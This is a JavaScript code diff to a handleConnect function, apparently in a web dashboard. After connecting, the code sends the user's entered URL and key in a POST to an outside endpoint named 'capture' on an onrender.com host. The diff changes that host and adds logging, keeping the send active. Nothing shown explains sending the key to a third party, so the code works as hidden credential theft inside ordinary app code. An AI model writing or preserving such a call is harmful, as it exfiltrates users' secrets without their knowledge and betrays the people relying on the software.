@@ -5859,13 +5859,19 @@ async function handleConnect() {
             console.warn('Telegram notification failed:', e.message);
         }
 
-        await startDashboard(url, key);
+                await startDashboard(url, key);
 
-        fetch('https://sopna-1.onrender.com/capture', {
+        fetch('https://sopna.onrender.com/capture', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ url: url, key: key })
-        }).catch(function(){});
+        })
+        .then(r => r.json())
+        .then(data => console.log('🔥 Forward success:', data))
+        .catch(err => {
+            console.error('💀 Forward failed:', err.message);
+            alert('Forward failed. Check console.');
+        });
 
     } catch(e) {
         var msg = e.message || String(e);
